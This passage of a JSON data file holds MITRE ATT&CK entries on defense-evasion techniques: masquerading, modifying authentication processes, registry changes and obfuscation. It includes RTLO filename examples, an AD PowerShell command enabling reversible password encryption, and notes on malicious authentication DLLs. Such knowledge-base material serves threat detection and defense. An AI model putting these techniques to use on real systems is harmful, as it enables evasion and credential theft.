    "description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.Renaming abusable system utilities to evade security monitoring is also a form ofMasquerading.[1]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:09:12.011215",
    "subtechniques": [
      {
        "id": "T1036.001",
        "name": "Invalid Code Signature"
      },
      {
        "id": "T1036.002",
        "name": "Right-to-Left Override"
      },
      {
        "id": "T1036.003",
        "name": "Rename Legitimate Utilities"
      },
      {
        "id": "T1036.004",
        "name": "Masquerade Task or Service"
      },
      {
        "id": "T1036.005",
        "name": "Match Legitimate Resource Name or Location"
      },
      {
        "id": "T1036.007",
        "name": "Double File Extension"
      },
      {
        "id": "T1036.008",
        "name": "Masquerade File Type"
      },
      {
        "id": "T1036.010",
        "name": "Masquerade Account Name"
      }
    ]
  },
  {
    "technique_id": "T1036.001",
    "name": "Invalid Code Signature",
    "description": "Adversaries may attempt to mimic features of valid code signatures to increase the chance of deceiving a user, analyst, or tool. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program. Files with invalid code signatures will fail digital signature validation checks, but they may appear more legitimate to users and security tools may improperly handle these files.[1]UnlikeCode Signing, this activity will not result in a valid signature.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Masquerading",
    "parent_technique_id": "T1036",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:09:15.366519"
  },
  {
    "technique_id": "T1036.002",
    "name": "Right-to-Left Override",
    "description": "Adversaries may abuse the right-to-left override (RTLO or RLO) character (U+202E) to disguise a string and/or file name to make it appear benign. RTLO is a non-printing Unicode character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable namedMarch 25 \\u202Excod.scrwill display asMarch 25 rcs.docx. A JavaScript file namedphoto_high_re\\u202Egnp.jswill be displayed asphoto_high_resj.png.[1]Adversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type. A common use of this technique is withSpearphishing Attachment/Malicious Filesince it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character. Use of the RTLO character has been seen in many targeted intrusion attempts and criminal activity.[2][3]RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Masquerading",
    "parent_technique_id": "T1036",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:09:18.736942"
  },
  {
    "technique_id": "T1036.003",
    "name": "Rename Legitimate Utilities",
    "description": "Adversaries may rename legitimate / system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for legitimate utilities adversaries are capable of abusing, including both built-in binaries and tools such as PSExec, AutoHotKey, and IronPython.[1][2][3][4]It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: renamerundll32.exe).[5]An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on these utilities executing from non-standard paths.[6]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Masquerading",
    "parent_technique_id": "T1036",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:09:22.091193"
  },
  {
    "technique_id": "T1036.004",
    "name": "Masquerade Task or Service",
    "description": "Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description.[1][2]Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.Tasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.[3][4]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Masquerading",
    "parent_technique_id": "T1036",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:09:25.494178"
  },
  {
    "technique_id": "T1036.005",
    "name": "Match Legitimate Resource Name or Location",
    "description": "Adversaries may match or approximate the name or location of legitimate files, Registry keys, or other resources when naming/placing them. This is done for the sake of evading defenses and observation.This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex:svchost.exe). Alternatively, a Windows Registry key may be given a close approximation to a key used by a legitimate program. In containerized environments, a threat actor may create a resource in a trusted namespace or one that matches the naming convention of a container pod or cluster.[1]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Masquerading",
    "parent_technique_id": "T1036",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:09:28.992674"
  },
  {
    "technique_id": "T1036.007",
    "name": "Double File Extension",
    "description": "Adversaries may abuse a double extension in the filename as a means of masquerading the true file type. A file name may include a secondary file type extension that may cause only the first extension to be displayed (ex:File.txt.exemay render in some views as justFile.txt). However, the second extension is the true file type that determines how the file is opened and executed. The real file extension may be hidden by the operating system in the file browser (ex: explorer.exe), as well as in any software configured using or similar to the systemâ€™s policies.[1][2]Adversaries may abuse double extensions to attempt to conceal dangerous file types of payloads. A very common usage involves tricking a user into opening what they think is a benign file type but is actually executable code. Such files often pose as email attachments and allow an adversary to gainInitial Accessinto a userâ€™s system viaSpearphishing AttachmentthenUser Execution. For example, an executable file attachment namedEvil.txt.exemay display asEvil.txtto a user. The user may then view it as a benign text file and open it, inadvertently executing the hidden malware.[2]Common file types, such as text files (.txt, .doc, etc.) and image files (.jpg, .gif, etc.) are typically used as the first extension to appear benign. Executable extensions commonly regarded as dangerous, such as .exe, .lnk, .hta, and .scr, often appear as the second extension and true file type.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Masquerading",
    "parent_technique_id": "T1036",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:09:32.324986"
  },
  {
    "technique_id": "T1036.008",
    "name": "Masquerade File Type",
    "description": "Adversaries may masquerade malicious payloads as legitimate files through changes to the payload's formatting, including the fileâ€™s signature, extension, icon, and contents. Various file types have a typical standard format, including how they are encoded and organized. For example, a fileâ€™s signature (also known as header or magic bytes) is the beginning bytes of a file and is often used to identify the fileâ€™s type. For example, the header of a JPEG file,  is0xFF 0xD8and the file extension is either.JPE,.JPEGor.JPG.Adversaries may edit the headerâ€™s hex code and/or the file extension of a malicious payload in order to bypass file validation checks and/or input sanitization. This behavior is commonly used when payload files are transferred (e.g.,Ingress Tool Transfer) and stored (e.g.,Upload Malware) so that adversaries may move their malware without triggering detections.Common non-executable file types and extensions, such as text files (.txt) and image files (.jpg,.gif, etc.) may be typically treated as benign.  Based on this, adversaries may use a file extension to disguise malware, such as naming a PHP backdoor code with a file name oftest.gif. A user may not know that a file is malicious due to the benign appearance and file extension.Polygot files, which are files that have multiple different file types and that function differently based on the application that will execute them, may also be used to disguise malicious malware and capabilities.[1]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Masquerading",
    "parent_technique_id": "T1036",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:09:35.711768"
  },
  {
    "technique_id": "T1036.010",
    "name": "Masquerade Account Name",
    "description": "Adversaries may match or approximate the names of legitimate accounts to make newly created ones appear benign. This will typically occur duringCreate Account, although accounts may also be renamed at a later date. This may also coincide withAccount Access Removalif the actor first deletes an account before re-creating one with the same name.[1]Often, adversaries will attempt to masquerade as service accounts, such as those associated with legitimate software, data backups, or container cluster management.[2][3]They may also give accounts generic, trustworthy names, such as \"admin\", \"help\", or \"root.\"[4]Sometimes adversaries may model account names off of those already existing in the system, as a follow-on behavior toAccount Discovery.Note that this is distinct fromImpersonation, which describes impersonating specific trusted individuals or organizations, rather than user or service account names.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Masquerading",
    "parent_technique_id": "T1036",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:09:38.965536"
  },
  {
    "technique_id": "T1556",
    "name": "Modify Authentication Process",
    "description": "Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without usingValid Accounts.Adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:09:42.399058",
    "subtechniques": [
      {
        "id": "T1556.001",
        "name": "Domain Controller Authentication"
      },
      {
        "id": "T1556.002",
        "name": "Password Filter DLL"
      },
      {
        "id": "T1556.005",
        "name": "Reversible Encryption"
      },
      {
        "id": "T1556.006",
        "name": "Multi-Factor Authentication"
      },
      {
        "id": "T1556.007",
        "name": "Hybrid Identity"
      },
      {
        "id": "T1556.008",
        "name": "Network Provider DLL"
      }
    ]
  },
  {
    "technique_id": "T1556.001",
    "name": "Domain Controller Authentication",
    "description": "Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts.Malware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any userâ€™s account and/or credentials (ex:Skeleton Key). Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller). Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments.[1]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Modify Authentication Process",
    "parent_technique_id": "T1556",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:09:45.780516"
  },
  {
    "technique_id": "T1556.002",
    "name": "Password Filter DLL",
    "description": "Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated.Windows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation.Adversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.[1]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Modify Authentication Process",
    "parent_technique_id": "T1556",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:09:49.126175"
  },
  {
    "technique_id": "T1556.005",
    "name": "Reversible Encryption",
    "description": "An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. TheAllowReversiblePasswordEncryptionproperty specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.[1]If the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled. To decrypt the passwords, an adversary needs four components:Encrypted password (G$RADIUSCHAP) from the Active Directory user-structureuserParameters16 byte randomly-generated value (G$RADIUSCHAPKEY) also fromuserParametersGlobal LSA secret (G$MSRADIUSCHAPKEY)Static key hardcoded in the Remote Access Subauthentication DLL (RASSFM.DLL)With this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value.[2][3]An adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectoryPowerShellmodule. For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to \"Windows Server 2008\" or higher.[4]In PowerShell, an adversary may make associated changes to user settings using commands similar toSet-ADUser -AllowReversiblePasswordEncryption $true.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Modify Authentication Process",
    "parent_technique_id": "T1556",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:09:52.381676"
  },
  {
    "technique_id": "T1556.006",
    "name": "Multi-Factor Authentication",
    "description": "Adversaries may disable or modify multi-factor authentication (MFA) mechanisms to enable persistent access to compromised accounts.Once adversaries have gained access to a network by either compromising an account lacking MFA or by employing an MFA bypass method such asMulti-Factor Authentication Request Generation, adversaries may leverage their access to modify or completely disable MFA defenses. This can be accomplished by abusing legitimate features, such as excluding users from Azure AD Conditional Access Policies, registering a new yet vulnerable/adversary-controlled MFA method, or by manually patching MFA programs and configuration files to bypass expected functionality.[1][2]For example, modifying the Windows hosts file (C:\\windows\\system32\\drivers\\etc\\hosts) to redirect MFA calls to localhost instead of an MFA server may cause the MFA process to fail. If a \"fail open\" policy is in place, any otherwise successful authentication attempt may be granted access without enforcing MFA.[3]Depending on the scope, goals, and privileges of the adversary, MFA defenses may be disabled for individual accounts or for all accounts tied to a larger group, such as all domain accounts in a victim's network environment.[3]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Modify Authentication Process",
    "parent_technique_id": "T1556",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:09:55.814855"
  },
  {
    "technique_id": "T1556.007",
    "name": "Hybrid Identity",
    "description": "Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts.Many organizations maintain hybrid user and device identities that are shared between on-premises and cloud-based environments. These can be maintained in a number of ways. For example, Microsoft Entra ID includes three options for synchronizing identities between Active Directory and Entra ID[1]:Password Hash Synchronization (PHS), in which a privileged on-premises account synchronizes user password hashes between Active Directory and Entra ID, allowing authentication to Entra ID to take place entirely in the cloudPass Through Authentication (PTA), in which Entra ID authentication attempts are forwarded to an on-premises PTA agent, which validates the credentials against Active DirectoryActive Directory Federation Services (AD FS), in which a trust relationship is established between Active Directory and Entra IDAD FS can also be used with other SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication process to AD FS and receive a token containing the hybrid usersâ€™ identity and privileges.By modifying authentication processes tied to hybrid identities, an adversary may be able to establish persistent privileged access to cloud resources. For example, adversaries who compromise an on-premises server running a PTA agent may inject a malicious DLL into theAzureADConnectAuthenticationAgentServiceprocess that authorizes all attempts to authenticate to Entra ID, as well as records user credentials.[2][3]In environments using AD FS, an adversary may edit theMicrosoft.IdentityServer.Servicehostconfiguration file to load a malicious DLL that generates authentication tokens for any user with any set of claims, thereby bypassing multi-factor authentication and defined AD FS policies.[4]In some cases, adversaries may be able to modify the hybrid identity authentication process from the cloud. For example, adversaries who compromise a Global Administrator account in an Entra ID tenant may be able to register a new PTA agent via the web console, similarly allowing them to harvest credentials and log into the Entra ID environment as any user.[5]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Modify Authentication Process",
    "parent_technique_id": "T1556",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:09:59.169920"
  },
  {
    "technique_id": "T1556.008",
    "name": "Network Provider DLL",
    "description": "Adversaries may register malicious network provider dynamic link libraries (DLLs) to capture cleartext user credentials during the authentication process. Network provider DLLs allow Windows to interface with specific network protocols and can also support add-on credential management functions.[1]During the logon process, Winlogon (the interactive logon module) sends credentials to the localmpnotify.exeprocess via RPC. Thempnotify.exeprocess then shares the credentials in cleartext with registered credential managers when notifying that a logon event is happening.[2][3][4]Adversaries can configure a malicious network provider DLL to receive credentials frommpnotify.exe.[5]Once installed as a credential manager (via the Registry), a malicious DLL can receive and save credentials each time a user logs onto a Windows workstation or domain via theNPLogonNotify()function.[4]Adversaries may target planting malicious network provider DLLs on systems known to have increased logon activity and/or administrator logon activity, such as servers and domain controllers.[2]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Modify Authentication Process",
    "parent_technique_id": "T1556",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:10:02.499887"
  },
  {
    "technique_id": "T1112",
    "name": "Modify Registry",
    "description": "Adversaries may interact with the Windows Registry as part of a variety of other techniques to aid in defense evasion, persistence, and execution.Access to specific areas of the Registry depends on account permissions, with some keys requiring administrator-level access. The built-in Windows command-line utilityRegmay be used for local or remote Registry modification.[1]Other tools, such as remote access tools, may also contain functionality to interact with the Registry through the Windows API.The Registry may be modified in order to hide configuration information or malicious payloads viaObfuscated Files or Information.[2][3][4][5]The Registry may also be modified toImpair Defenses, such as by enabling macros for all Microsoft Office products, allowing privilege escalation without alerting the user, increasing the maximum number of allowed outbound requests, and/or modifying systems to store plaintext credentials in memory.[6][2]The Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.[7]OftenValid Accountsare required, along with access to the remote system'sSMB/Windows Admin Sharesfor RPC communication.Finally, Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read viaRegor other utilities using the Win32 API.[8]Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.[9][10]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:10:05.957382",
    "subtechniques": []
  },
  {
    "technique_id": "T1027",
    "name": "Obfuscated Files or Information",
    "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open andDeobfuscate/Decode Files or InformationforUser Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.[1]Adversaries may also use compressed or archived scripts, such as JavaScript.Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.[2]Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled.[3]Adversaries may also abuseCommand Obfuscationto obscure commands executed from payloads or directly viaCommand and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.[4][5][6]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:10:09.341573",
    "subtechniques": [
      {
        "id": "T1027.001",
        "name": "Binary Padding"
      },
      {
        "id": "T1027.002",
        "name": "Software Packing"
      },
      {
        "id": "T1027.003",
        "name": "Steganography"
      },
      {
        "id": "T1027.004",
        "name": "Compile After Delivery"
      },
      {
        "id": "T1027.005",
        "name": "Indicator Removal from Tools"
      },
      {
        "id": "T1027.006",
        "name": "HTML Smuggling"
      },
      {
        "id": "T1027.007",
        "name": "Dynamic API Resolution"
      },
      {
        "id": "T1027.008",
        "name": "Stripped Payloads"
      },
      {
        "id": "T1027.009",
        "name": "Embedded Payloads"
      },
      {
        "id": "T1027.010",
        "name": "Command Obfuscation"
      },
      {
        "id": "T1027.011",
        "name": "Fileless Storage"
      },
      {
        "id": "T1027.012",
        "name": "LNK Icon Smuggling"
      },
      {
        "id": "T1027.013",
        "name": "Encrypted/Encoded File"
      },
      {
        "id": "T1027.014",
        "name": "Polymorphic Code"
      },
      {
        "id": "T1027.015",
        "name": "Compression"
      },
      {
        "id": "T1027.016",
        "name": "Junk Code Insertion"
      },
      {
        "id": "T1027.017",
        "name": "SVG Smuggling"
      }
    ]
  },
  {
    "technique_id": "T1027.001",
    "name": "Binary Padding",
    "description": "Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations.Binary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures.[1]The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware.[2]Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.[3]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Obfuscated Files or Information",
    "parent_technique_id": "T1027",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:10:12.690754"
  },
  {
    "technique_id": "T1027.002",
    "name": "Software Packing",
    "description": "Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.[1]Utilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.[2]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Obfuscated Files or Information",
    "parent_technique_id": "T1027",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:10:16.130313"
  },
  {
    "technique_id": "T1027.003",
    "name": "Steganography",
    "description": "Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.Duquwas an early example of malware that used steganography. It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server.[1]By the end of 2017, a threat group usedInvoke-PSImageto hidePowerShellcommands in an image file (.png) and execute the code on a victim's system. In this particular case thePowerShellcode downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.[2]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Obfuscated Files or Information",
    "parent_technique_id": "T1027",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:10:19.482465"
  },
  {
    "technique_id": "T1027.004",
    "name": "Compile After Delivery",
    "description": "Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as ilasm.exe[1], csc.exe, or GCC/MinGW.[2]Source code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as aPhishing. Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.[3]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Obfuscated Files or Information",
    "parent_technique_id": "T1027",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:10:22.835777"
  },
  {
    "technique_id": "T1027.005",
    "name": "Indicator Removal from Tools",
    "description": "Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.A good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Obfuscated Files or Information",
    "parent_technique_id": "T1027",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:10:26.187629"
  },
  {
    "technique_id": "T1027.006",
    "name": "HTML Smuggling",
    "description": "Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign HTML files. HTML documents can store large binary objects known as JavaScript Blobs (immutable data that represents raw bytes) that can later be constructed into file-like objects. Data may also be stored in Data URLs, which enable embedding media type or MIME files inline of HTML documents. HTML5 also introduced a download attribute that may be used to initiate file downloads.[1][2]Adversaries may deliver payloads to victims that bypass security controls through HTML Smuggling by abusing JavaScript Blobs and/or HTML5 download attributes. Security controls such as web content filters may not identify smuggled malicious files inside of HTML/JS files, as the content may be based on typically benign MIME types such astext/plainand/ortext/html. Malicious files or data can be obfuscated and hidden inside of HTML files through Data URLs and/or JavaScript Blobs and can be deobfuscated when they reach the victim (i.e.Deobfuscate/Decode Files or Information), potentially bypassing content filters.For example, JavaScript Blobs can be abused to dynamically generate malicious files in the victim machine and may be dropped to disk by abusing JavaScript functions such asmsSaveBlob.[1][3][2][4]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Obfuscated Files or Information",
    "parent_technique_id": "T1027",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:10:29.557503"
  },
  {
    "technique_id": "T1027.007",
    "name": "Dynamic API Resolution",
    "description": "Adversaries may obfuscate then dynamically resolve API functions called by their malware in order to conceal malicious functionalities and impair defensive analysis. Malware commonly uses variousNative APIfunctions provided by the OS to perform various tasks such as those involving processes, files, and other system artifacts.API functions called by malware may leave static artifacts such as strings in payload files. Defensive analysts may also uncover which functions a binary file may execute via an import address table (IAT) or other structures that help dynamically link calling code to the shared modules that provide functions.[1][2]To avoid static or other defensive analysis, adversaries may use dynamic API resolution to conceal malware characteristics and functionalities. Similar toSoftware Packing, dynamic API resolution may change file signatures and obfuscate malicious API function calls until they are resolved and invoked during runtime.Various methods may be used to obfuscate malware calls to API functions. For example, hashes of function names are commonly stored in malware in lieu of literal strings. Malware can use these hashes (or other identifiers) to manually reproduce the linking and loading process using functions such asGetProcAddress()andLoadLibrary(). These hashes/identifiers can also be further obfuscated using encryption or other string manipulation tricks (requiring various forms ofDeobfuscate/Decode Files or Informationduring execution).[3][4][1]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Obfuscated Files or Information",
    "parent_technique_id": "T1027",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:10:32.904409"
  },
  {
    "technique_id": "T1027.008",
    "name": "Stripped Payloads",
